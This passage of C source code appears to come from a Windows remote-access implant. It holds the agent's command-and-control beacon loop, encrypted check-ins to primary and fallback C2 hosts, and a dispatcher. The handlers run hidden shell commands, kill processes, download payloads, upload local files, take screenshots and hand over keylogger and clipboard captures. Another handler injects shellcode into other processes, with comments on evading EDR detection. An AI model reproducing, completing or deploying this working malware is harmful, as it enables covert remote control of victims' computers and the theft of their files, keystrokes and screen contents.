    g_http.SetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof timeout);
    g_http.SetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof timeout);

    INTERNET_PORT port = (g_c2.port != 0)
        ? (INTERNET_PORT)g_c2.port
        : (g_c2.use_tls ? INTERNET_DEFAULT_HTTPS_PORT
                        : INTERNET_DEFAULT_HTTP_PORT);

    HINTERNET hConnect = g_http.Connect(hSession, g_c2.host, port, 0);
    if (!hConnect) {
        c2_log("http: WinHttpConnect failed (%lu)", GetLastError());
        g_http.CloseHandle(hSession);
        return resp;
    }

    DWORD req_flags = g_c2.use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = g_http.OpenRequest(hConnect, method, uri,
                                             NULL, NULL, NULL, req_flags);
    if (!hRequest) {
        c2_log("http: WinHttpOpenRequest failed (%lu)", GetLastError());
        g_http.CloseHandle(hConnect);
        g_http.CloseHandle(hSession);
        return resp;
    }

    /* Suppress TLS certificate errors — C2 typically uses self-signed certs */
    if (g_c2.use_tls) {
        DWORD sf = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        g_http.SetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                          &sf, sizeof sf);
    }

    /* Headers: Content-Type (when body present) + session token */
    WCHAR extra[512];
    if (req_body && req_body_len > 0) {
        _snwprintf_s(extra, 512, _TRUNCATE,
                     L"Content-Type: application/octet-stream\r\n"
                     L"%s: %S\r\n",
                     C2_SESS_HEADER, g_c2.agent_id);
    } else {
        _snwprintf_s(extra, 512, _TRUNCATE,
                     L"%s: %S\r\n", C2_SESS_HEADER, g_c2.agent_id);
    }

    BOOL ok = g_http.SendRequest(hRequest, extra, (DWORD)-1L,
                                   (LPVOID)req_body, req_body_len,
                                   req_body_len, 0);
    if (!ok) {
        c2_log("http: WinHttpSendRequest failed (%lu)", GetLastError());
        goto cleanup;
    }
    if (!g_http.ReceiveResponse(hRequest, NULL)) {
        c2_log("http: WinHttpReceiveResponse failed (%lu)", GetLastError());
        goto cleanup;
    }

    /* Status code */
    DWORD sc = 0, sc_sz = sizeof sc;
    g_http.QueryHeaders(hRequest,
                         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                         WINHTTP_HEADER_NAME_BY_INDEX,
                         &sc, &sc_sz, WINHTTP_NO_HEADER_INDEX);
    resp.status = sc;

    /* Drain response body */
    BYTE  *body    = NULL;
    SIZE_T body_sz = 0;
    for (;;) {
        DWORD avail = 0;
        if (!g_http.QueryDataAvailable(hRequest, &avail) || avail == 0) break;
        BYTE *tmp = (BYTE *)realloc(body, body_sz + avail + 1);
        if (!tmp) { free(body); body = NULL; break; }
        body = tmp;
        DWORD rd = 0;
        if (!g_http.ReadData(hRequest, body + body_sz, avail, &rd) || rd == 0) break;
        body_sz += rd;
    }
    if (body) { body[body_sz] = '\0'; resp.body = body; resp.body_len = body_sz; }

cleanup:
    g_http.CloseHandle(hRequest);
    g_http.CloseHandle(hConnect);
    g_http.CloseHandle(hSession);
    return resp;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 9 — Beacon protocol
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * encrypt_and_b64 — encrypt plaintext bytes then base64-encode the blob.
 * Returns malloc'd base64 string + its length via *out_len.
 * Caller frees.
 */
static char *encrypt_and_b64(const BYTE *plain, SIZE_T plain_len, SIZE_T *out_len) {
    EncBlob blob = aes_encrypt(plain, plain_len);
    if (!blob.data) return NULL;
    char *b64 = b64_encode(blob.data, blob.len, out_len);
    free(blob.data);
    return b64;
}

/*
 * beacon_checkin
 * Encrypts a JSON check-in, POSTs it to C2_BEACON_URI.
 * Parses and decrypts the response to extract a task blob.
 * Returns malloc'd task string (caller frees) or NULL if no task / error.
 */
static char *beacon_checkin(void) {
    char os_ver[32] = {0};
    get_os_version(os_ver, sizeof os_ver);
    LONG seq = InterlockedIncrement(&g_c2.seq);

    char checkin[512];
    int  clen = snprintf(checkin, sizeof checkin,
        "{\"id\":\"%s\",\"host\":\"%s\",\"user\":\"%s\","
        "\"os\":\"%s\",\"priv\":%d,\"seq\":%ld}",
        g_c2.agent_id, g_c2.hostname, g_c2.username,
        os_ver, g_c2.is_admin, (long)seq);

    SIZE_T b64_len = 0;
    char *b64 = encrypt_and_b64((const BYTE *)checkin, (SIZE_T)clen, &b64_len);
    if (!b64) { c2_log("checkin: encrypt failed"); return NULL; }

    HttpResp resp = http_request(L"POST", C2_BEACON_URI,
                                  (const BYTE *)b64, (DWORD)b64_len);
    free(b64);

    if (!resp.body || resp.status != 200) {
        if (resp.body) free(resp.body);
        c2_log("checkin: failed (http=%lu)", resp.status);
        return NULL;
    }
    if (resp.body_len == 0) { free(resp.body); return NULL; }  /* NOP */

    /* Trim whitespace */
    char  *rb  = (char *)resp.body;
    SIZE_T rbl = resp.body_len;
    while (rbl > 0 && (rb[rbl-1] == '\r' || rb[rbl-1] == '\n' || rb[rbl-1] == ' '))
        rb[--rbl] = '\0';

    /* Base64 decode */
    SIZE_T dec_len = 0;
    BYTE  *dec = b64_decode(rb, rbl, &dec_len);
    free(resp.body);
    if (!dec) { c2_log("checkin: b64 decode failed"); return NULL; }

    /* AES decrypt */
    SIZE_T task_len = 0;
    BYTE  *task = aes_decrypt(dec, dec_len, &task_len);
    free(dec);
    if (!task) { c2_log("checkin: decrypt failed"); return NULL; }

    c2_log("checkin: task received (%zu bytes)", task_len);
    return (char *)task;
}

/*
 * post_result — encrypt result_str and POST to C2_RESULT_URI.
 * result_str format: CMD_TYPE '\n' exit_status '\n' data
 */
static void post_result(const char *result_str) {
    if (!result_str) return;
    SIZE_T rlen = strlen(result_str);
    SIZE_T b64_len = 0;
    char *b64 = encrypt_and_b64((const BYTE *)result_str, rlen, &b64_len);
    if (!b64) { c2_log("result: encrypt failed"); return; }

    HttpResp resp = http_request(L"POST", C2_RESULT_URI,
                                  (const BYTE *)b64, (DWORD)b64_len);
    free(b64);
    if (resp.body) free(resp.body);
    c2_log("result: posted (%zu chars, http=%lu)", rlen, resp.status);
}

/*
 * task_split — split task_blob at newlines into a NULL-terminated array.
 * Returns malloc'd array of malloc'd strings.  *count set to line count.
 * Call task_split_free() when done.
 */
static char **task_split(const char *blob, int *count) {
    *count = 0;
    int cap = 8;
    char **arr = (char **)malloc(cap * sizeof(char *));
    if (!arr) return NULL;

    const char *p = blob;
    while (p && *p) {
        const char *nl  = strchr(p, '\n');
        SIZE_T       len = nl ? (SIZE_T)(nl - p) : strlen(p);
        while (len > 0 && p[len-1] == '\r') len--;  /* strip CR */

        if (*count >= cap - 1) {
            cap *= 2;
            char **tmp = (char **)realloc(arr, cap * sizeof(char *));
            if (!tmp) break;
            arr = tmp;
        }
        char *line = (char *)malloc(len + 1);
        if (!line) break;
        memcpy(line, p, len);
        line[len] = '\0';
        arr[(*count)++] = line;

        if (!nl) break;
        p = nl + 1;
    }
    arr[*count] = NULL;
    return arr;
}

static void task_split_free(char **arr, int count) {
    for (int i = 0; i < count; i++) free(arr[i]);
    free(arr);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 10 — Command handlers
 * Each handler builds a result_blob and calls post_result().
 * Result prefix: CMD_TYPE '\n' exit_code '\n' data
 * ═══════════════════════════════════════════════════════════════════════════ */

/* 10.1 NOP ---------------------------------------------------------------- */
static void cmd_nop(void) {
    c2_log("cmd: NOP");
    /* No result posted — NOP is silent */
}

/* 10.2 SHELL ------------------------------------------------------------- */
/*
 * Run a command in a hidden cmd.exe, capture combined stdout+stderr through
 * an anonymous pipe, return output + exit code to C2.
 *
 * GOTCHA: The write end of the pipe must be closed in the parent before
 *         ReadFile, otherwise ReadFile blocks indefinitely even after the
 *         child exits because the OS still sees an open write handle.
 */
static void cmd_shell(const char *command) {
    if (!command || !*command) {
        post_result("SHELL\n1\nno command given");
        return;
    }
    c2_log("cmd: SHELL — %.120s", command);

    char cmdline[2048];
    snprintf(cmdline, sizeof cmdline, "cmd.exe /c %s 2>&1", command);

    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof sa);
    sa.nLength              = sizeof sa;
    sa.bInheritHandle       = TRUE;

    HANDLE pipe_rd = NULL, pipe_wr = NULL;
    if (!CreatePipe(&pipe_rd, &pipe_wr, &sa, 0)) {
        post_result("SHELL\n2\nCreatePipe failed");
        return;
    }
    /* Prevent read end from being inherited by the child */
    SetHandleInformation(pipe_rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof si);
    ZeroMemory(&pi, sizeof pi);
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = pipe_wr;
    si.hStdError   = pipe_wr;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pipe_rd);
        CloseHandle(pipe_wr);
        post_result("SHELL\n3\nCreateProcess failed");
        return;
    }
    CloseHandle(pipe_wr);   /* parent no longer needs the write end */

    /* Collect output */
    char  *out_buf = NULL;
    SIZE_T out_cap = 0, out_len = 0;
    char   tmp[4096];
    DWORD  rd;

    while (ReadFile(pipe_rd, tmp, sizeof tmp, &rd, NULL) && rd > 0) {
        BYTE *nb = (BYTE *)realloc(out_buf, out_cap + rd + 1);
        if (!nb) break;
        out_buf = (char *)nb;
        memcpy(out_buf + out_len, tmp, rd);
        out_len += rd;
        out_cap  = out_len;
    }
    CloseHandle(pipe_rd);

    DWORD exit_code = 1;
    WaitForSingleObject(pi.hProcess, 30000);
    GetExitCodeProcess(pi.hProcess, &exit_code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Assemble result blob */
    char hdr[64];
    int  hlen = snprintf(hdr, sizeof hdr, "SHELL\n%lu\n", exit_code);
    char *result = (char *)malloc((SIZE_T)hlen + out_len + 1);
    if (result) {
        memcpy(result, hdr, (SIZE_T)hlen);
        if (out_buf && out_len) memcpy(result + hlen, out_buf, out_len);
        result[hlen + out_len] = '\0';
        post_result(result);
        free(result);
    }
    if (out_buf) free(out_buf);
}

/* 10.3 PS ---------------------------------------------------------------- */
/*
 * List all running processes: PID, name, parent PID.
 * Uses Toolhelp32 — same approach as boom.c's detect_process().
 */
static void cmd_ps(void) {
    c2_log("cmd: PS");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        post_result("PS\n1\nCreateToolhelp32Snapshot failed");
        return;
    }

    SIZE_T cap = 65536;
    char  *buf = (char *)malloc(cap);
    if (!buf) { CloseHandle(snap); return; }

    int    hlen = snprintf(buf, cap, "PS\n0\nPID\tNAME\tPPID\r\n");
    SIZE_T off  = (SIZE_T)hlen;

    PROCESSENTRY32A pe;
    pe.dwSize = sizeof pe;
    if (Process32FirstA(snap, &pe)) {
        do {
            char line[MAX_PATH + 32];
            int  llen = snprintf(line, sizeof line, "%lu\t%s\t%lu\r\n",
                                  pe.th32ProcessID, pe.szExeFile,
                                  pe.th32ParentProcessID);
            if (off + (SIZE_T)llen + 1 >= cap) {
                cap *= 2;
                char *tmp = (char *)realloc(buf, cap);
                if (!tmp) break;
                buf = tmp;
            }
            memcpy(buf + off, line, (SIZE_T)llen);
            off += (SIZE_T)llen;
        } while (Process32NextA(snap, &pe));
    }
    CloseHandle(snap);
    buf[off] = '\0';
    post_result(buf);
    free(buf);
}

/* 10.4 KILL -------------------------------------------------------------- */
static void cmd_kill(const char *pid_str) {
    if (!pid_str || !*pid_str) { post_result("KILL\n1\nno PID"); return; }
    DWORD pid = (DWORD)strtoul(pid_str, NULL, 10);
    c2_log("cmd: KILL pid=%lu", pid);

    HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!proc) {
        char r[80];
        snprintf(r, sizeof r, "KILL\n2\nOpenProcess failed (err=%lu)", GetLastError());
        post_result(r);
        return;
    }
    TerminateProcess(proc, 1);
    CloseHandle(proc);
    post_result("KILL\n0\nok");
}

/* 10.5 DOWNLOAD ---------------------------------------------------------- */
/*
 * Fetch a file from the C2 (GET /cdn-cgi/static/<remote_name>) and write it
 * to local_path on disk.
 */
static void cmd_download(const char *remote_name, const char *local_path) {
    if (!remote_name || !local_path) {
        post_result("DOWNLOAD\n1\nmissing params");
        return;
    }
    c2_log("cmd: DOWNLOAD %s → %s", remote_name, local_path);

    WCHAR uri[1024];
    _snwprintf_s(uri, 1024, _TRUNCATE, L"%s%S", C2_DL_URI_PREFIX, remote_name);

    HttpResp resp = http_request(L"GET", uri, NULL, 0);
    if (!resp.body || resp.status != 200) {
        char r[80];
        snprintf(r, sizeof r, "DOWNLOAD\n2\nHTTP %lu", resp.status);
        if (resp.body) free(resp.body);
        post_result(r);
        return;
    }

    HANDLE h = CreateFileA(local_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        free(resp.body);
        post_result("DOWNLOAD\n3\nCreateFile failed");
        return;
    }
    DWORD written;
    WriteFile(h, resp.body, (DWORD)resp.body_len, &written, NULL);
    CloseHandle(h);
    free(resp.body);

    char r[200];
    snprintf(r, sizeof r, "DOWNLOAD\n0\n%lu bytes → %s", (DWORD)resp.body_len, local_path);
    post_result(r);
}

/* 10.6 UPLOAD ------------------------------------------------------------ */
/*
 * Read a local file, prepend a result header, encrypt, POST to C2.
 * The decrypted payload received by the C2 is:
 *   "UPLOAD\n0\n<filename>\n<raw file bytes>"
 *
 * GOTCHA: HeapAlloc for large files — malloc is fine here but cap at
 *         C2_MAX_UPLOAD_BYTES to prevent OOM on multi-GB files.
 */
static void cmd_upload(const char *local_path) {
    if (!local_path || !*local_path) { post_result("UPLOAD\n1\nno path"); return; }
    c2_log("cmd: UPLOAD %s", local_path);

    HANDLE h = CreateFileA(local_path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { post_result("UPLOAD\n2\nopen failed"); return; }

    DWORD fsize = GetFileSize(h, NULL);
    if (fsize == 0 || fsize == INVALID_FILE_SIZE || fsize > C2_MAX_UPLOAD_BYTES) {
        CloseHandle(h);
        post_result("UPLOAD\n3\nfile empty or too large (>50 MB)");
        return;
    }

    const char *fname = strrchr(local_path, '\\');
    fname = fname ? fname + 1 : local_path;

    char hdr[256];
    int  hlen = snprintf(hdr, sizeof hdr, "UPLOAD\n0\n%s\n", fname);

    BYTE *payload = (BYTE *)malloc((SIZE_T)hlen + fsize);
    if (!payload) { CloseHandle(h); post_result("UPLOAD\n4\nmalloc failed"); return; }
    memcpy(payload, hdr, (SIZE_T)hlen);

    DWORD rd = 0;
    ReadFile(h, payload + hlen, fsize, &rd, NULL);
    CloseHandle(h);

    SIZE_T b64_len = 0;
    char *b64 = encrypt_and_b64(payload, (SIZE_T)hlen + rd, &b64_len);
    free(payload);
    if (!b64) { post_result("UPLOAD\n5\nencrypt failed"); return; }

    HttpResp resp = http_request(L"POST", C2_RESULT_URI,
                                  (const BYTE *)b64, (DWORD)b64_len);
    free(b64);
    if (resp.body) free(resp.body);

    c2_log("upload: %s sent (%lu bytes)", fname, rd);
}

/* 10.7 SCREENSHOT -------------------------------------------------------- */
/*
 * Capture the full virtual desktop (all monitors) into a BMP in memory,
 * then upload it encrypted to C2.
 *
 * GOTCHA: SM_CXVIRTUALSCREEN / SM_CYVIRTUALSCREEN cover all monitors.
 *         SM_CXSCREEN is the primary monitor only — wrong for multi-monitor.
 * GOTCHA: GetDIBits top-down (biHeight negative) gives correct pixel order
 *         for a BMP written to disk; positive biHeight would flip the image.
 */
static void cmd_screenshot(void) {
    c2_log("cmd: SCREENSHOT");

    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (cx <= 0 || cy <= 0) { post_result("SCREENSHOT\n1\nno display"); return; }

    HDC     screen_dc = GetDC(NULL);
    HDC     mem_dc    = CreateCompatibleDC(screen_dc);
    HBITMAP bmp       = CreateCompatibleBitmap(screen_dc, cx, cy);
    HGDIOBJ old       = SelectObject(mem_dc, bmp);

    BitBlt(mem_dc, 0, 0, cx, cy, screen_dc, x, y, SRCCOPY | CAPTUREBLT);

    BITMAPINFOHEADER bih;
    ZeroMemory(&bih, sizeof bih);
    bih.biSize        = sizeof bih;
    bih.biWidth       = cx;
    bih.biHeight      = -cy;    /* negative = top-down */
    bih.biPlanes      = 1;
    bih.biBitCount    = 32;
    bih.biCompression = BI_RGB;
    DWORD pixel_bytes = (DWORD)(cx * cy * 4);

    BYTE *pixels = (BYTE *)malloc(pixel_bytes);
    if (!pixels) {
        SelectObject(mem_dc, old);
        DeleteObject(bmp); DeleteDC(mem_dc); ReleaseDC(NULL, screen_dc);
        post_result("SCREENSHOT\n2\nmalloc pixels failed");
        return;
    }
    GetDIBits(screen_dc, bmp, 0, (UINT)cy, pixels,
              (BITMAPINFO *)&bih, DIB_RGB_COLORS);

    SelectObject(mem_dc, old);
    DeleteObject(bmp); DeleteDC(mem_dc); ReleaseDC(NULL, screen_dc);

    BITMAPFILEHEADER bfh;
    ZeroMemory(&bfh, sizeof bfh);
    bfh.bfType    = 0x4D42;   /* 'BM' */
    bfh.bfOffBits = sizeof bfh + sizeof bih;
    bfh.bfSize    = bfh.bfOffBits + pixel_bytes;

    /* Header for upload: SCREENSHOT\n0\nYYYYMMDD_HHMMSS\n */
    SYSTEMTIME st; GetLocalTime(&st);
    char hdr[128];
    int  hlen = snprintf(hdr, sizeof hdr,
                          "SCREENSHOT\n0\n%04d%02d%02d_%02d%02d%02d\n",
                          st.wYear, st.wMonth, st.wDay,
                          st.wHour, st.wMinute, st.wSecond);

    SIZE_T bmp_sz  = sizeof bfh + sizeof bih + pixel_bytes;
    SIZE_T total   = (SIZE_T)hlen + bmp_sz;
    BYTE  *payload = (BYTE *)malloc(total);
    if (!payload) {
        free(pixels);
        post_result("SCREENSHOT\n3\nmalloc payload failed");
        return;
    }
    memcpy(payload, hdr, (SIZE_T)hlen);
    memcpy(payload + hlen, &bfh, sizeof bfh);
    memcpy(payload + hlen + sizeof bfh, &bih, sizeof bih);
    memcpy(payload + hlen + sizeof bfh + sizeof bih, pixels, pixel_bytes);
    free(pixels);

    SIZE_T b64_len = 0;
    char *b64 = encrypt_and_b64(payload, total, &b64_len);
    free(payload);
    if (!b64) { post_result("SCREENSHOT\n4\nencrypt failed"); return; }

    HttpResp resp = http_request(L"POST", C2_RESULT_URI,
                                  (const BYTE *)b64, (DWORD)b64_len);
    free(b64);
    if (resp.body) free(resp.body);
    c2_log("screenshot: sent (%lu pixel bytes, %dx%d)", pixel_bytes, cx, cy);
}

/* 10.8 INJECT ------------------------------------------------------------ */
/*
 * Decode base64 shellcode and inject into the target PID via the classic
 * VirtualAllocEx → WriteProcessMemory → CreateRemoteThread triad.
 *
 * GOTCHA: PAGE_EXECUTE_READWRITE allocation in a remote process is a high-
 *         confidence AV / EDR detection signal.  Production builds should
 *         allocate PAGE_READWRITE, write, then VirtualProtectEx to PAGE_EXECUTE_READ
 *         before creating the thread.  Shown in plaintext here for clarity.
 */
static void cmd_inject(const char *pid_str, const char *sc_b64) {
    if (!pid_str || !sc_b64) { post_result("INJECT\n1\nmissing params"); return; }
    DWORD pid = (DWORD)strtoul(pid_str, NULL, 10);
    c2_log("cmd: INJECT pid=%lu sc_b64_len=%zu", pid, strlen(sc_b64));

    SIZE_T sc_len = 0;
    BYTE  *sc     = b64_decode(sc_b64, strlen(sc_b64), &sc_len);
    if (!sc || sc_len == 0) {
        if (sc) free(sc);
        post_result("INJECT\n2\nb64 decode failed");
        return;
    }

    enable_privilege(SE_DEBUG_NAME);

    HANDLE proc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!proc) {
        free(sc);
        char r[96];
        snprintf(r, sizeof r, "INJECT\n3\nOpenProcess(%lu) err=%lu",
                 pid, GetLastError());
        post_result(r);
        return;
    }

    /* Allocate RW first, then change to RX after write */
    LPVOID remote = VirtualAllocEx(proc, NULL, sc_len,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_READWRITE);
    if (!remote) {
        CloseHandle(proc); free(sc);
        post_result("INJECT\n4\nVirtualAllocEx failed");
        return;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(proc, remote, sc, sc_len, &written) || written != sc_len) {
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc); free(sc);
        post_result("INJECT\n5\nWriteProcessMemory failed");
        return;
    }
    free(sc);

    /* Flip to RX before execution — halves EDR confidence vs RWX */
    DWORD old_prot;
    VirtualProtectEx(proc, remote, sc_len, PAGE_EXECUTE_READ, &old_prot);

    HANDLE thread = CreateRemoteThread(proc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remote,
                                        NULL, 0, NULL);
    if (!thread) {
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc);
        post_result("INJECT\n6\nCreateRemoteThread failed");
        return;
    }
    WaitForSingleObject(thread, 5000);
    CloseHandle(thread);
    VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
    CloseHandle(proc);

    char r[96];
    snprintf(r, sizeof r, "INJECT\n0\n%zu bytes → pid %lu", sc_len, pid);
    post_result(r);
    c2_log("%s", r);
}

/* 10.9 SLEEP ------------------------------------------------------------- */
static void cmd_sleep(const char *interval_str, const char *jitter_str) {
    if (!interval_str) { post_result("SLEEP\n1\nmissing interval"); return; }
    DWORD new_ms     = (DWORD)(strtoul(interval_str, NULL, 10) * 1000UL);
    int   new_jitter = jitter_str ? atoi(jitter_str) : g_c2.jitter_pct;

    if (new_ms      < 1000) new_ms     = 1000;
    if (new_jitter  < 0)    new_jitter = 0;
    if (new_jitter  > 90)   new_jitter = 90;

    g_c2.beacon_ms  = new_ms;
    g_c2.jitter_pct = new_jitter;

    char r[96];
    snprintf(r, sizeof r, "SLEEP\n0\nbeacon=%lums jitter=%d%%",
             new_ms, new_jitter);
    c2_log("cmd: %s", r);
    post_result(r);
}

/* 10.10 KEYLOG_GET ------------------------------------------------------- */
static void cmd_keylog_get(void) {
    c2_log("cmd: KEYLOG_GET");
    cmd_upload(C2_KEYLOG_FILE);
}

/* 10.11 CLIP_GET --------------------------------------------------------- */
static void cmd_clip_get(void) {
    c2_log("cmd: CLIP_GET");
    cmd_upload(C2_CLIP_FILE);
}

/* 10.12 DIE -------------------------------------------------------------- */
static void cmd_die(void) {
    c2_log("cmd: DIE — signalling shutdown");
    post_result("DIE\n0\nshutdown ack");
    g_c2.shutdown = TRUE;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 11 — Command dispatcher
 * task_blob format: CMD_TYPE '\n' param1 '\n' param2 ...
 * ═══════════════════════════════════════════════════════════════════════════ */

static void dispatch(const char *task_blob) {
    if (!task_blob || !*task_blob) { cmd_nop(); return; }

    int    count = 0;
    char **lines = task_split(task_blob, &count);
    if (!lines || count == 0) { cmd_nop(); return; }

    const char *cmd = lines[0];
    const char *p1  = (count > 1) ? lines[1] : NULL;
    const char *p2  = (count > 2) ? lines[2] : NULL;

    c2_log("dispatch: %s (params=%d)", cmd, count - 1);

    if      (!strcmp(cmd, CMD_NOP))        cmd_nop();
    else if (!strcmp(cmd, CMD_SHELL))      cmd_shell(p1);
    else if (!strcmp(cmd, CMD_PS))         cmd_ps();
    else if (!strcmp(cmd, CMD_KILL))       cmd_kill(p1);
    else if (!strcmp(cmd, CMD_DOWNLOAD))   cmd_download(p1, p2);
    else if (!strcmp(cmd, CMD_UPLOAD))     cmd_upload(p1);
    else if (!strcmp(cmd, CMD_SCREENSHOT)) cmd_screenshot();
    else if (!strcmp(cmd, CMD_INJECT))     cmd_inject(p1, p2);
    else if (!strcmp(cmd, CMD_SLEEP))      cmd_sleep(p1, p2);
    else if (!strcmp(cmd, CMD_KEYLOG_GET)) cmd_keylog_get();
    else if (!strcmp(cmd, CMD_CLIP_GET))   cmd_clip_get();
    else if (!strcmp(cmd, CMD_DIE))        cmd_die();
    else {
        char r[160];
        snprintf(r, sizeof r, "UNKNOWN\n1\nunrecognised command: %.64s", cmd);
        c2_log("dispatch: %s", r);
        post_result(r);
    }

    task_split_free(lines, count);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 12 — Fallback C2 switchover
 * After C2_FAIL_THRESHOLD consecutive beacon errors, switch between
 * primary and fallback endpoints.  On the next successful check-in
 * after switching, fail_count resets.
 * ═══════════════════════════════════════════════════════════════════════════ */

static void c2_try_switch(void) {
    if (!g_c2.using_fallback) {
        c2_log("c2: %d consecutive failures — switching to fallback (%S:%d)",
               g_c2.fail_count, C2_HOST_FALLBACK, C2_PORT_FALLBACK);
        g_c2.host           = C2_HOST_FALLBACK;
        g_c2.port           = C2_PORT_FALLBACK;
        g_c2.use_tls        = C2_USE_TLS_FALLBACK;
        g_c2.using_fallback = 1;
    } else {
        c2_log("c2: fallback also failing — cycling back to primary (%S:%d)",
               C2_HOST_PRIMARY, C2_PORT_PRIMARY);
        g_c2.host           = C2_HOST_PRIMARY;
        g_c2.port           = C2_PORT_PRIMARY;
        g_c2.use_tls        = C2_USE_TLS_PRIMARY;
        g_c2.using_fallback = 0;
    }
    g_c2.fail_count = 0;
    /* Extra back-off so we don't hammer the network on a dead C2 */
    Sleep(C2_RECONNECT_DELAY_MS);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 13 — Public API
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * c2_init
 * Resolve agent identity, derive AES key, load WinHTTP, set initial C2 target.
 * Must be called once before any other c2_* function.
 * Safe to call multiple times — subsequent calls are no-ops if already init'd.
 */
void c2_init(void) {
    if (g_c2.key_ready) return;   /* already initialised */

    ZeroMemory(&g_c2,   sizeof g_c2);
    ZeroMemory(&g_http, sizeof g_http);

    /* Ensure log directory exists */
    CreateDirectoryA(C2_LOG_DIR, NULL);

    /* AES key derivation */
    g_c2.key_ready = crypto_derive_key(C2_KEY_PASSPHRASE, g_c2.aes_key);
    if (!g_c2.key_ready)
        c2_log("c2_init: WARNING — key derivation failed");

    /* Agent identity */
    derive_agent_id(g_c2.agent_id, sizeof g_c2.agent_id);
    DWORD sz = sizeof g_c2.hostname;
    GetComputerNameA(g_c2.hostname, &sz);
    sz = sizeof g_c2.username;
    GetUserNameA(g_c2.username, &sz);
    g_c2.is_admin = c2_is_admin();

    /* C2 target — start on primary */
    g_c2.host           = C2_HOST_PRIMARY;
    g_c2.port           = C2_PORT_PRIMARY;
    g_c2.use_tls        = C2_USE_TLS_PRIMARY;
    g_c2.using_fallback = 0;

    /* Timing */
    g_c2.beacon_ms  = C2_BEACON_INTERVAL_MS;
    g_c2.jitter_pct = C2_JITTER_PCT;

    /* Pre-load WinHTTP so the first beacon doesn't have load latency */
    winhttp_load();

    c2_log("c2_init: agent=%s host=%S:%d tls=%d admin=%d key=%s",
           g_c2.agent_id, g_c2.host, g_c2.port, g_c2.use_tls,
           g_c2.is_admin, g_c2.key_ready ? "ok" : "FAIL");
}

/*
 * c2_report_event
 * Drop-in replacement for net_beacon() in boom.c.
 * Encrypts a short event payload and POSTs it to the beacon endpoint.
 * Fire-and-forget: response is ignored.
 * Safe to call from any thread at any point after c2_init().
 */
void c2_report_event(const char *event, const char *detail) {
    if (!event) return;
    c2_log("event: %s — %s", event, detail ? detail : "(none)");
    if (!g_c2.key_ready) return;

    char payload[512];
    snprintf(payload, sizeof payload, "EVENT\n%s\n%s",
             event, detail ? detail : "");

    SIZE_T b64_len = 0;
    char *b64 = encrypt_and_b64((const BYTE *)payload,
                                  strlen(payload), &b64_len);
    if (!b64) return;

    HttpResp resp = http_request(L"POST", C2_BEACON_URI,
                                  (const BYTE *)b64, (DWORD)b64_len);
    free(b64);
    if (resp.body) free(resp.body);
}

/*
 * c2_run
 * Main beacon loop.  Call after c2_init() and after starting lb_payload's
 * collection threads (keylog, screenshot, clipboard).
 * Blocks until g_c2.shutdown is set by CMD_DIE or c2_shutdown().
 *
 * Sleep is broken into 1-second chunks so a shutdown signal is checked at
 * least once per second rather than once per full beacon interval.
 */
void c2_run(void) {
    c2_log("c2_run: entering loop (interval=%lums jitter=%d%%)",
           g_c2.beacon_ms, g_c2.jitter_pct);

    while (!g_c2.shutdown) {
        /* Encrypted check-in → receive task */
        char *task = beacon_checkin();

        if (!task) {
            g_c2.fail_count++;
            c2_log("c2_run: checkin failed (fail_count=%d)", g_c2.fail_count);
            if (g_c2.fail_count >= C2_FAIL_THRESHOLD)
                c2_try_switch();
        } else {
            g_c2.fail_count = 0;
            dispatch(task);
            free(task);
        }

        if (g_c2.shutdown) break;

        /* Jittered sleep — interruptible at 1-second resolution */
        DWORD sleep_ms = compute_jitter_ms(g_c2.beacon_ms, g_c2.jitter_pct);
        c2_log("c2_run: sleeping %lums", sleep_ms);

        DWORD slept = 0;
        while (!g_c2.shutdown && slept < sleep_ms) {
            DWORD chunk = (sleep_ms - slept > 1000) ? 1000 : (sleep_ms - slept);
            Sleep(chunk);
            slept += chunk;
        }
    }

